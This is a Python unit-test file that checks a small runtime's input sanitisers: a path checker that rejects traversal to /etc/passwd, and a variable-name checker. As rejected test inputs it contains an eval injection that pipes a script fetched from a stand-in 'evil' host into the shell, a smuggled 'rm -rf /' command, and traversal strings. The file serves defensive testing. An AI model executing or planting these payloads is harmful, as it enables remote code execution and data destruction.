"""Unit tests for ``topo._safety`` boundary-input sanitisation helpers.

Run: ``python3 -m unittest topo-lang-python.runtime.test.test_safety``
"""

from __future__ import annotations

import os
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from topo import _safety  # noqa: E402


class SanitizePath(unittest.TestCase):

    def setUp(self):
        self.root = Path(tempfile.mkdtemp(prefix="topo-safety-"))

    def tearDown(self):
        import shutil
        shutil.rmtree(self.root, ignore_errors=True)

    def test_accepts_relative_subpath(self):
        resolved = _safety.sanitize_path("foo/bar.txt", self.root)
        self.assertIsNotNone(resolved)
        self.assertTrue(str(resolved).startswith(str(self.root.resolve())))

    def test_rejects_parent_ref_attack(self):
        # ``../../etc/passwd`` is the canonical path-traversal payload.
        self.assertIsNone(_safety.sanitize_path("../../etc/passwd", self.root))
        self.assertIsNone(
            _safety.sanitize_path("foo/../../etc/passwd", self.root))

    def test_rejects_absolute_outside_root(self):
        self.assertIsNone(_safety.sanitize_path("/etc/passwd", self.root))

    def test_rejects_empty(self):
        self.assertIsNone(_safety.sanitize_path("", self.root))
        self.assertIsNone(_safety.sanitize_path("foo", ""))

    def test_rejects_symlink_crossing_root(self):
        if os.name == "nt":
            self.skipTest("symlink creation needs privileges on Windows")
        link = self.root / "link-out"
        try:
            link.symlink_to("/etc/passwd")
        except OSError:
            self.skipTest("symlink creation not permitted")
        self.assertIsNone(_safety.sanitize_path(link.name, self.root))


class SafeVarName(unittest.TestCase):

    def test_accepts_identifier(self):
        self.assertTrue(_safety.safe_var_name("vec"))
        self.assertTrue(_safety.safe_var_name("_private"))
        self.assertTrue(_safety.safe_var_name("v0"))
        self.assertTrue(_safety.safe_var_name("snake_case_99"))

    def test_rejects_eval_payload(self):
        # The audited shell-injection payload from
        # topo-lang-python-pdb-and-bridge-probe-expression-injection.
        self.assertFalse(
            _safety.safe_var_name(
                "__import__('os').system('curl evil/sh | sh')#"))
        self.assertFalse(_safety.safe_var_name("1+1"))
        self.assertFalse(_safety.safe_var_name("vec; rm -rf /"))
        self.assertFalse(_safety.safe_var_name("vec()"))

    def test_rejects_empty_and_non_str(self):
        self.assertFalse(_safety.safe_var_name(""))
        self.assertFalse(_safety.safe_var_name(None))  # type: ignore[arg-type]
        self.assertFalse(_safety.safe_var_name(42))  # type: ignore[arg-type]

    def test_rejects_leading_digit(self):
        # Python identifiers cannot start with a digit; eval'ing
        # ``1var = …`` is a SyntaxError but the gate is the right
        # place to reject (vs surface a confusing eval error later).
        self.assertFalse(_safety.safe_var_name("1var"))

    def test_rejects_unicode(self):
        # Stay ASCII to keep parity with the C++ basename gate; unicode
        # identifiers are syntactically valid in Python but expand the
        # sanitiser's responsibility beyond what the threat model needs.
        self.assertFalse(_safety.safe_var_name("vé"))


if __name__ == "__main__":
    unittest.main()
